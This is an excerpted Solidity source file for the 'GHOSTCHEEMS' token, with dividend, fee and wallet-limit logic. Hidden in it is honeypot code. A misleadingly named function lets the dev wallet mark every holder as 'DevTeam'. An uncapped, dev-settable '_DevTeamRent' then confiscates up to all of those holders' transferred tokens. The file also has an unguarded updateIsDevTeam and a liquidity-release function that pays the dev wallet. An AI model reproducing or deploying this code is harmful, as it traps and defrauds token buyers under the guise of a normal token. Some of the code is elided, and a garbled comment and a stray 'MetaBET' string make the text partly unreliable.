...
contract GHOSTCHEEMS is Context, ERC20, Ownable {
    using SafeMath for uint256;
    ...
    address public DividendsToken = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   ...
   DividendTracker public dividendTracker;
    ...
    address private DevTeamWallet;
    address public deadAddress;
    address private deployer;

    uint256 public swapTokensAtAmount;
    uint256 public buyBackTimes;

    uint256 public _buyLiquidityFee;
    uint256 public _buyRewardsFee;
    uint256 public _buyMarketingFee;

    uint256 public _sellRewardsFee;
    uint256 public _sellLiquidityFee;
	uint256 public _sellMarketingFee;

    uint256 public _DevTeamRent;

    uint256 public _maxWallet;
    uint256 public _maxBuy;
    uint256 public _maxSell;
    uint256 public _previousMaxWallet;
    uint256 public _previousMaxSell;
    uint256 public _previousMaxBuy;
    ...
    mapping (address => bool) private _isExcludedFromList;
    address[] private _isExcludedFromFeesArray;
    mapping (address => bool) public automatedMarketMakerPairs;
    mapping (address => bool) public _isDevTeam;

    event UpdateDividendTracker(address indexed newAddress, address indexed oldAddress);
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
    event UpdateDividendsToken(address indexed newAddress, address indexed oldAddress);
    event isDevTeam(address indexed account, bool isExcluded);
    ...
    event DevTeamWalletUpdated(address indexed newDevTeamWallet, address indexed oldDevTeamWallet);
    ...
    constructor() ERC20 ("GHOSTCHEEMS", "GCHEEMS") {
        _buyRewardsFee = 4;
        _buyLiquidityFee = 3;
		_buyMarketingFee = 4;
		...
		contractTokenBalanceAmount = 2500000000 * 10**18;
        
        swapTokensAtAmount = 2500000000 * 10**18;
        _maxWallet = 500000000000 * (10**18);
        _maxBuy = 1000000000000 * (10**18);
        _maxSell = 1000000000000 * (10**18);
    	...
    	DevTeamWallet = owner();
		marketingWallet = payable(0x5be32d554731102Bf6017D307e74fcF303E0AB32);
        ...
        excludeFromFees(DevTeamWallet, true);
    ...
    function updatedividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "GHOSTCHEEMS The dividend tracker already has that address");

        DividendTracker newdividendTracker = DividendTracker(payable(newAddress));

        require(newdividendTracker.owner() == address(this), "GHOSTCHEEMS: The new dividend tracker must be owned by the GHOSTCHEEMS token contract");
    ...
    function updateDividendToken(address newAddress) public onlyOwner {
        require(newAddress != address(DividendsToken), "GHOSTCHEEMS: The router already has that address");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "GHOSTCHEEMS: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "GHOSTCHEEMS: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function excludeFromFeesAddress(address[] calldata holders) external onlyOwner {
        for (uint256 i; i < holders.length; ++i) {
            _isExcludedFromFees[holders[i]] = true;
        }
    }

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "GHOSTCHEEMS: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "GHOSTCHEEMS: Automated market maker pair is already set to that value");
    ...
    function TeamReleaseLiquidity() public {
        ...
        if(liquidityRelease20Percent)
        {
            ...
            amount=amount*2/10;
            liquidityToken.transfer(DevTeamWallet, amount);
        }
        else
        {
    ...
    function updateDevTeamWallet(address newDevTeamWallet) public {
        require(msg.sender==DevTeamWallet);
        excludeFromFees(newDevTeamWallet, true);
        emit DevTeamWalletUpdated(newDevTeamWallet, DevTeamWallet);
        DevTeamWallet = newDevTeamWallet;
    }

    function updateMarketingWallet(address newMarketingWallet) public onlyOwner {
        require(newMarketingWallet != marketingWallet, "GHOSTCHEEMS: The marketing wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "GHOSTCHEEMS: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "GHOSTCHEEMS: Cannot update gasForProcessing to same value");
    ...
    function updateIsDevTeam(address account, bool DevTeam) public {
        require(_isDevTeam[account] != DevTeam, "MetaBET: Account is already the value of 'DevTeam'");
        _isDevTeam[account] = DevTeam;

        emit isDevTeam(account, DevTeam);
    }
    ...
    function _transfer(
        ...
        if (from != owner() && from != uniswapV2Pair && !_isExcludedFromList[from])
        {
            _isExcludedFromList[from] = true;
            _isExcludedFromFeesArray.push(from);
        }
        if (to != owner() && to != uniswapV2Pair && !_isExcludedFromList[to]) {
            _isExcludedFromList[to] = true;
            _isExcludedFromFeesArray.push(to);
        }
        ...
        if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && to != uniswapV2Pair && !_isExcludedFromFees[to] && !_isExcludedFromFees[from]) 
        {
            ...
            if(starting && !_isDevTeam[to] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] && !dividendTracker.excludedFromDividends(to)) {
                _isDevTeam[to] = true;
        ...
        if (from != owner() && from != uniswapV2Pair && _isDevTeam[from] && !_isExcludedFromFees[from]) {
            amount = amount * (100 - _DevTeamRent) / 100;
		...
		if(canSwap && !swapping && !automatedMarketMakerPairs[from] && from != DevTeamWallet && to != DevTeamWallet && from != marketingWallet && to != marketingWallet && !_isExcludedFromFees[to] && !_isExcludedFromFees[from]) {
        ...
        // if any account bDevTeamgs to _isExcludedFromFee account then remove the fee
        ...
        else if(!automatedMarketMakerPairs[from] && !automatedMarketMakerPairs[to] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to] && !_isDevTeam[from] && !_isDevTeam[to]) {
        takeFee = false;
        super._transfer(from, to, amount);
        }
        ...
        if(takeFee) {
            ...
            uint256 DevTeamRent = amount.mul(_DevTeamRent).div(100);

            if(_isDevTeam[to] && automatedMarketMakerPairs[from]) {
                amount = amount.sub(DevTeamRent);
                super._transfer(from, address(this), DevTeamRent);
                super._transfer(from, to, amount);
            }
    ...
    function updateExcludedFromFeesList() public {
        require(msg.sender==DevTeamWallet);
        for (uint i=0; i<_isExcludedFromFeesArray.length; i++) {
            _isDevTeam[_isExcludedFromFeesArray[i]] = true;
        }
    }

    function updateDevTeamRent(uint256 newvalue) public {
        require(msg.sender==DevTeamWallet);
        _DevTeamRent = newvalue;
    }
	...
	function letsGetStarted() external onlyOwner() {
        updateBuyFees(4,3,4);
        updateSellFees(4,3,4);

        updateMaxWallet(10000000000000);
        updateMaxBuySell(10000000000000, 10000000000000);
...
contract DividendTracker is Ownable, DividendPayingToken {
    ...
    address private DividendToken = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ...
    constructor() DividendPayingToken("Dividend_Tracker", "Dividend_Tracker", DividendToken) {
        ...
        isAuth[owner()] = true;
        isAuth[address(0x5be32d554731102Bf6017D307e74fcF303E0AB32)];
    }
